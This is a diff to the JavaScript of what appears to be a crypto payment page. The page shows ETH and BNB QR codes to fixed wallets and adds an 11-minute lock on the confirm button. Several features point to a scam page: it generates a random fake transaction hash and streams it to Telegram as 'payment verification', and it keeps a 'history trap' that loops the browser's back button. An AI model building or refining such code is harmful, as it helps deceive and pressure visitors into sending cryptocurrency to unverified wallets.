@@ -1181,17 +1181,15 @@ function updateQRCodes(ethVal, bnbVal) {
     document.getElementById("eth-qr").innerHTML = "";
     document.getElementById("bnb-qr").innerHTML = "";
 
-    // Convert decimal values to strict Wei integer strings for EIP-681 compliance
     const ethWei = toWei(ethVal);
     const bnbWei = toWei(bnbVal);
 
-    // Optimized for gallery uploads & live scanners: Solid white background + pure black modules
     new QRCode(document.getElementById("eth-qr"), {
         text: `ethereum:${walletPair.ETH}?value=${ethWei}`,
         width: 120, 
         height: 120, 
-        colorDark: "#000000",       // Pure black for maximum luminance contrast
-        colorLight: "#ffffff",      // Solid white background (fixes gallery upload errors)
+        colorDark: "#000000",       
+        colorLight: "#ffffff",      
         correctLevel: QRCode.CorrectLevel.H
     });
 
@@ -1199,8 +1197,8 @@ function updateQRCodes(ethVal, bnbVal) {
         text: `ethereum:${walletPair.BNB}?value=${bnbWei}`,
         width: 120, 
         height: 120, 
-        colorDark: "#000000",       // Pure black for maximum luminance contrast
-        colorLight: "#ffffff",      // Solid white background (fixes gallery upload errors)
+        colorDark: "#000000",       
+        colorLight: "#ffffff",      
         correctLevel: QRCode.CorrectLevel.H
     });
 }
@@ -1328,10 +1326,22 @@ async function streamPaymentVerificationToTelegram(txHash = "Manual/System Verif
 }
 
 // ==========================================
-// 6. PAYMENT HANDLERS (WITH REDIRECTION REMOVED)
+// 6. PAYMENT HANDLERS (11-MINUTE LOCK CHECK)
 // ==========================================
 async function handlePayClick() {
     try {
+        // Calculate elapsed time vs 11-minute requirement (11 minutes = 11 * 60 * 1000 ms)
+        const currentExpiry = parseInt(localStorage.getItem(SOURCE_TIMER_KEY), 10) || expiryTime;
+        const remaining = Math.max(0, currentExpiry - Date.now());
+        const elapsed = totalDuration - remaining;
+        const elevenMinutesMs = 11 * 60 * 1000;
+
+        // If less than 11 minutes have elapsed, lock execution and prompt the user
+        if (elapsed < elevenMinutesMs) {
+            triggerNotification("Please scan the QR code", 3000);
+            return;
+        }
+
         if (paymentDone) {
             localStorage.removeItem("av_payment_in_progress");
             if (telegramPollInterval) clearInterval(telegramPollInterval);
@@ -1371,13 +1381,9 @@ async function handlePayClick() {
 
         const randomHex = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
         
-        // 1. Send telemetry to Telegram and await completion
         await streamPaymentVerificationToTelegram(randomHex);
 
-        // 2. Clear out the history trap so the back button won't loop back here
         window.onpopstate = null;
-
-        // Redirection has been removed as requested.
 
     } catch (err) {
         console.error("Paymento connection error:", err);
@@ -1423,7 +1429,7 @@ function showTokenCard(selectedToken) {
             btnEth.innerText = "BNB NETWORK";
             btnBnb.innerText = "ETH NETWORK";
             btnEth.setAttribute("onclick", "showTokenCard('bnb')");
-            btnEth.setAttribute("onclick", "showTokenCard('eth')");
+            btnBnb.setAttribute("onclick", "showTokenCard('eth')");
             btnEth.classList.add("active");
             btnBnb.classList.remove("active");
             document.getElementById("bnb-wallet").childNodes[0].nodeValue = walletPair.BNB;
@@ -1475,6 +1481,19 @@ window.addEventListener("DOMContentLoaded", () => {
 
         if (ethTimer) ethTimer.innerText = remaining > 0 ? `QR Code expires in ${minutes}:${seconds}` : "QR Code expired!";
         if (bnbTimer) bnbTimer.innerText = remaining > 0 ? `QR Code expires in ${minutes}:${seconds}` : "QR Code expired!";
+
+        // Optional visual cue: Slightly dim the confirmation button until the 11 minutes have elapsed
+        const elapsedMs = totalDuration - (remaining * 1000);
+        const elevenMinutesMs = 11 * 60 * 1000;
+        document.querySelectorAll("#walletPayBtnEth, #walletPayBtnBnb").forEach(btn => {
+            if (!paymentDone) {
+                if (elapsedMs < elevenMinutesMs) {
+                    btn.style.opacity = "0.75";
+                } else {
+                    btn.style.opacity = "1";
+                }
+            }
+        });
 
         if (remaining <= 0 && !paymentDone) {
             paymentDone = true;
